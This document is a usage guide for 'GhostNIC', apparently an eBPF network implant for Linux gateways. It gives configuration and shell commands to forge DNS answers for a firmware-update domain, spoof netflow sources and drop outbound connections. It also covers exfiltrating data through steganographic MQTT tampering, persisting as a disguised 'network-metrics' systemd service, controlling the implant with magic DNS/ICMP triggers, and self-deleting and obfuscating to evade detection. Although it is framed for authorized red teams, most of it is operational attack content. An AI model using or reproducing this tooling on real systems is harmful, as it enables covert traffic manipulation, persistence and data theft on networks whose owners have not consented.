# GhostNIC offensive playbook

This guide is for authorized red-team operators who want to use GhostNIC in a
controlled lab or assessment environment.

## Operational model

GhostNIC is designed to persist without userspace processes.  After the loader
runs it attaches the XDP and TC programs, populates anonymous maps, and can
delete itself.  The only remaining state is in the XDP/TC attachments on the
target interface; maps are not pinned to `bpffs` by default.

## Initial access

You need a shell or equivalent capability on the target gateway with:

* Root or `CAP_BPF` + `CAP_NET_ADMIN`.
* A writable location for the loader binary.
* A `bpffs` mount at `/sys/fs/bpf/` (standard on modern Linux).

## Configuration

Create a JSON configuration file.  The example below forges DNS A and AAAA
answers for `firmware.update.iot`, drops C2 SYNs, and injects the hidden
message `GHOST` into outbound MQTT telemetry.

```json
{
  "interface": "eth0",
  "dns_targets": {
    "firmware.update.iot": "10.0.0.99"
  },
  "dns6_targets": {
    "firmware.update.iot": "2001:db8::99"
  },
  "netflow_collectors": [
    {
      "address": "192.168.1.100",
      "port": 2055,
      "spoof": "192.168.1.1"
    }
  ],
  "c2_targets": [
    {
      "address": "192.0.2.100",
      "port": 443
    }
  ],
  "mqtt_baseline": {
    "average": 150,
    "window": 10
  },
  "mqtt_encoder": {
    "key": 31337,
    "mode": 0
  },
  "mqtt_hidden_message": "GHOST"
}
```

Field reference:

| Field | Meaning |
|-------|---------|
| `interface` | Network interface to attach XDP and TC programs to. |
| `dns_targets` | Map of queried domain name to spoof IPv4 address. |
| `dns6_targets` | Map of queried domain name to spoof IPv6 address. |
| `netflow_collectors` | Collector destinations and the benign source address to substitute. |
| `c2_targets` | C2 endpoints whose outbound TCP SYNs are dropped. |
| `mqtt_baseline` | Size envelope that gates MQTT injection. |
| `mqtt_encoder` | XOR key and encoding mode. |
| `mqtt_hidden_message` | Covert message to encode into MQTT telemetry. |

## Load

```bash
# Dry-run to validate configuration
sudo ./build/ghost-load --config ghostnic.json --dry-run

# Load, attach, and delete the loader binary
sudo ./build/ghost-load --config ghostnic.json --self-destruct

# Load with inline runtime arguments instead of editing JSON
sudo ./build/ghost-load --iface eth0 \
  --dns evil.example.com:10.0.0.99 \
  --dns6 evil.example.com:2001:db8::99 \
  --c2 192.0.2.100:443 \
  --netflow 192.168.1.100:2055:192.168.1.1 \
  --self-destruct
```

After a successful load:

* `ip link show eth0` shows an XDP program ID.
* `tc filter show dev eth0 egress` shows the TC classifier.
* Maps are anonymous by default; no persistent `bpffs` path is left behind.

## Persistence

Install the loader as a systemd service named `network-metrics` so it reloads
on every boot:

```bash
sudo IFACE=eth0 CONFIG=/etc/network-metrics/config.json scripts/persist.sh
```

The service copies the loader to `/usr/local/sbin/.network-metrics` and the
control binary to `/usr/local/sbin/.network-metrics-ctl`.  Do not use
`--self-destruct` for the persistent copy, or the service cannot reload after
reboot.

## Operate

With anonymous maps, runtime map updates are not available.  Re-run the loader
with new CLI arguments or edit the JSON and reload.  To unload:

```bash
sudo ./build/ghost-ctl unload --iface eth0
```

## Exfiltration example

The MQTT injector encodes one bit per PUBLISH packet by adjusting the parity of
the last fractional digit of the first numeric value.  An operator with access
to the broker or a network tap can decode the message using the provided Python
decoder:

```bash
cat captured_mqtt_payloads.txt | python3 tests/decoder.py --key 31337
```

## Covert control channel

A shared `control_flag` map is pinned to an obfuscated bpffs path so it can be
updated without reloading the implant.  The flag is a bitmask:

| Bit | Effect |
|-----|--------|
| 0x01 | Disable MQTT steganography |
| 0x02 | Disable netflow poisoning |
| 0x04 | Disable C2 SYN drop and TLS SNI strip |

### In-kernel triggers

* **Magic DNS query**: any query whose name starts with `trigger.` toggles the
  flag through `0x01`, `0x02`, `0x04`, and back to `0`.
* **Magic ICMP echo**: an ICMP echo request whose payload begins with
  `trigger.` toggles the flag the same way.

Both triggers drop the triggering packet so it never reaches the real
resolver.

### Userspace trigger

```bash
# Disable MQTT injection
sudo ./build/ghost-ctl trigger 0x01

# Re-enable everything
sudo ./build/ghost-ctl trigger 0x00
```

## Cleanup

```bash
sudo ./build/ghost-ctl unload --iface eth0
```

This detaches the XDP program, removes the TC egress filter, and deletes the
pinned control flag.

## OPSEC notes

* Maps are anonymous by default to reduce `bpffs` indicators.
* The loader overwrites itself with zeros before unlinking when
  `--self-destruct` is used.
* Sensitive strings in the Go binaries are XOR obfuscated at build time;
  use `make release` to additionally build with `garble`.
* DNS forging only responds to matching A/AAAA queries; avoid high-volume
  domains to keep the response rate low.
* MQTT injection keeps packet sizes identical, so simple size-based anomaly
  detection will not flag it.
